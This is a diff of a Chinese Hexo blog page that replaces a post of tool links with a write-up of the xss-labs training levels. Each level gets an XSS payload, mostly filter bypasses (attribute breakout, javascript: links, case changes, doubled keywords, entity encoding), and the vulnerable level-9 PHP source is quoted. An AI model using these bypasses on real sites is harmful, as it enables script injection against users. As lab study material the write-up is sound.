@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>在线网址 |  小张之栈</title>
+      <title>xss-labs |  小张之栈</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/favicon.ico" />
@@ -64,7 +64,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-在线工具"
+  id="post-xss-labs"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -75,7 +75,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  在线网址
+  xss-labs
 </h1>
  
 
@@ -83,11 +83,11 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2023/05/13/%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7/" class="article-date">
-  <time datetime="2023-05-13T14:25:25.000Z" itemprop="datePublished">2023-05-13</time>
+      <a href="/2023/05/17/xss-labs/" class="article-date">
+  <time datetime="2023-05-17T07:11:37.000Z" itemprop="datePublished">2023-05-17</time>
 </a> 
   <div class="article-category">
-    <a class="article-category-link" href="/categories/%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7/">在线工具</a> / <a class="article-category-link" href="/categories/%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7/%E5%AD%A6%E4%B9%A0%E7%BD%91%E5%9D%80/">学习网址</a>
+    <a class="article-category-link" href="/categories/xss/">xss</a>
   </div>
   
 <div class="word_count">
@@ -95,7 +95,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">204</span>
+            <span class="post-count">666</span>
         </span>
     </span>
 
@@ -104,7 +104,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">1 分钟</span>
+            <span class="post-count">3 分钟</span>
         </span>
     </span>
 </div>
@@ -119,15 +119,45 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h2 id="一、在线工具"><a href="#一、在线工具" class="headerlink" title="一、在线工具"></a>一、在线工具</h2><p><a target="_blank" rel="noopener" href="https://c.runoob.com/compile/1/">PHP 在线工具 | 菜鸟工具 (runoob.com)</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.toolhelper.cn/EncodeDecode/Base64EncodeDecode">Base64 编码&#x2F;解码 - 在线工具 (toolhelper.cn)</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cmd5.com/">md5在线解密破解,md5解密加密 (cmd5.com)</a></p>
+  <h2 id="一、环境"><a href="#一、环境" class="headerlink" title="一、环境"></a>一、环境</h2><p>phpstudy</p>
+<h2 id="二、内容"><a href="#二、内容" class="headerlink" title="二、内容"></a>二、内容</h2><h3 id="1-level1"><a href="#1-level1" class="headerlink" title="1.level1"></a>1.level1</h3><p>url中添加</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;11&quot;)&lt;/script&gt;即可</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-level2-html实体化-lt-gt"><a href="#2-level2-html实体化-lt-gt" class="headerlink" title="2.level2(html实体化&lt;&gt;)"></a>2.level2(html实体化&lt;&gt;)</h3><p>输入level1中的值，发现&lt;&gt;被实体化了。</p>
+<p>构造input闭合</p>
+<p><code>&quot;&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></p>
+<h3 id="3-level3-html实体化”-lt-gt"><a href="#3-level3-html实体化”-lt-gt" class="headerlink" title="3.level3(html实体化”&lt;&gt;)"></a>3.level3(html实体化”&lt;&gt;)</h3><p>经过试验单引号不会被转义</p>
+<p>构造onmouseover事件，即鼠标触碰到input标签即还行该事件</p>
+<p><code>&#39; onmouseover=javascript:alert(1) &#39;</code></p>
+<h3 id="4-level4-html实体化’-lt-gt"><a href="#4-level4-html实体化’-lt-gt" class="headerlink" title="4.level4(html实体化’&lt;&gt;)"></a>4.level4(html实体化’&lt;&gt;)</h3><p>很好，单引号、尖括号没了</p>
+<p><code>&quot; onmouseover=javascript:alert(1) &quot;</code></p>
+<h3 id="5-level5-伪协议"><a href="#5-level5-伪协议" class="headerlink" title="5.level5(伪协议)"></a>5.level5(伪协议)</h3><p>script、onmouserover等中间会加个_符号</p>
+<p>知识点：伪协议：在url中调用js方法，如Data伪协议与Javascript协议</p>
+<p><code>&quot;&gt;&lt;a href=javascript:alert(&quot;123&quot;)&gt;&quot;</code></p>
+<p>点击链接跳转即可</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_33181292/article/details/117251090?ops_request_misc=&request_id=&biz_id=102&utm_term=xss%E4%BC%AA%E5%8D%8F%E8%AE%AE&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-117251090.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&spm=1018.2226.3001.4187">XSS_伪协议与编码绕过_伪协议绕过_南部余额的博客-CSDN博客</a></p>
+<p>​		<a target="_blank" rel="noopener" href="https://blog.csdn.net/K_ShenH/article/details/122765092?ops_request_misc=%7B%22request_id%22:%22168440472216800197061493%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168440472216800197061493&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-122765092-null-null.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=xss-labs&spm=1018.2226.3001.4187">xss-labs搭建及通关攻略_Lydia_Ha的博客-CSDN博客</a></p>
+<h3 id="6-level6-小写过滤"><a href="#6-level6-小写过滤" class="headerlink" title="6.level6(小写过滤)"></a>6.level6(小写过滤)</h3><p>在script的基础上，href、src、oneerror什么的中间也加符号了</p>
+<p>但没有大写过滤</p>
+<p><code>&quot;&gt;&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;</code></p>
+<h3 id="7-level7-标签名过滤"><a href="#7-level7-标签名过滤" class="headerlink" title="7.level7(标签名过滤)"></a>7.level7(标签名过滤)</h3><p>src啊,&lt;&gt;script啊都被删了、on啊</p>
+<p>双写绕过</p>
+<p><code>&quot;&gt;&lt;SCRscriptIPT&gt;alert(1)&lt;/SCRscriptIPT&gt;</code></p>
+<h3 id="8-level8-unicode编码"><a href="#8-level8-unicode编码" class="headerlink" title="8.level8(unicode编码)"></a>8.level8(unicode编码)</h3><p>它把输入框的值放在了a标签的href里</p>
+<p>scr字符后面会放_符号，且大写会被转化为小写</p>
+<p>引号也实体化了</p>
+<p>将代码进行unicode编码即可</p>
+<p>如<code>javascript:alert(1)</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</span><br></pre></td></tr></table></figure>
+
 <p><a target="_blank" rel="noopener" href="https://www.matools.com/code-convert-unicode">在线Unicode编码解码 - 码工具 (matools.com)</a></p>
-<h2 id="二、学习网址"><a href="#二、学习网址" class="headerlink" title="二、学习网址"></a>二、学习网址</h2><p>[Nessus安装与使用_nessus安装使用教程_@Camelus的博客-CSDN博客](<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_61506558/article/details/126803631?ops_request_misc=&request_id=&biz_id=102&utm_term=windows">https://blog.csdn.net/m0_61506558/article/details/126803631?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=windows</a> nessus安装&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2<del>all</del>sobaiduweb~default-1-126803631.142^v87^control_2,239^v2^insert_chatgpt&amp;spm&#x3D;1018.2226.3001.4187)</p>
-<p><a target="_blank" rel="noopener" href="https://bbs.zkaq.cn/">Track 安全社区 — 掌控安全在线教育- Track 知识社区 - 掌控安全在线教育 - Powered by 掌控者 (zkaq.cn)</a></p>
-<p><a target="_blank" rel="noopener" href="https://overthewire.org/wargames/natas/natas9.html">OverTheWire: Natas Level 8 → Level 9</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.52pojie.cn/forum.php">吾爱破解 - LCG - LSG|安卓破解|病毒分析|www.52pojie.cn</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44211968/article/details/124696627?ops_request_misc=%7B%22request_id%22:%22168441788816800211527620%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168441788816800211527620&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-124696627-null-null.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=xss%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7&spm=1018.2226.3001.4187">【Web 安全】XSS 攻击详解_xss攻击_想变厉害的大白菜的博客-CSDN博客</a></p>
+<h3 id="level9-继续过滤"><a href="#level9-继续过滤" class="headerlink" title="level9(继续过滤)"></a>level9(继续过滤)</h3><p>还是把输入框的值放在了a标签的href里，但是unicode编码不能用咯</p>
+<p>知识点:strpos()查找字符串在另一字符串中第一次出现的位置。</p>
+<p>源码有strpos函数过滤，限制输入内容必须有http:&#x2F;&#x2F;</p>
+<p><code>javas&amp;#99;ript:alert(&#39;http://123&#39;)</code></p>
+<p>部分源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);</span><br><span class="line">echo &#x27;&lt;center&gt;</span><br><span class="line">&lt;form action=level9.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(false===strpos($str7,&#x27;http://&#x27;))</span><br><span class="line">&#123;</span><br><span class="line">  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
  
       <!-- reward -->
       
@@ -192,12 +222,12 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/05/13/%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/05/17/xss-labs/" alt="微信分享二维码">
     </div>
 </div>
 
 <div id="share-mask"></div>  
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%85%B6%E5%AE%83%E5%B7%A5%E5%85%B7/" rel="tag">其它工具</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86/" rel="tag">加密解密</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%BD%91%E5%9D%80/" rel="tag">学习网址</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BC%96%E8%AF%91/" rel="tag">编译</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag">漏洞</a></li></ul>
 
     </footer>
   </div>
@@ -205,19 +235,10 @@
    
   <nav class="article-nav">
     
-      <a href="/2023/05/14/bandit-level-0-19/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            bandit(level 0-19)
-          
-        </div>
-      </a>
     
-    
-      <a href="/2023/05/13/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/" class="article-nav-link">
+      <a href="/2023/05/15/%E5%B0%81%E7%A5%9E%E5%8F%B0/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">渗透工具</div>
+        <div class="article-nav-title">封神台靶场</div>
       </a>
     
   </nav>
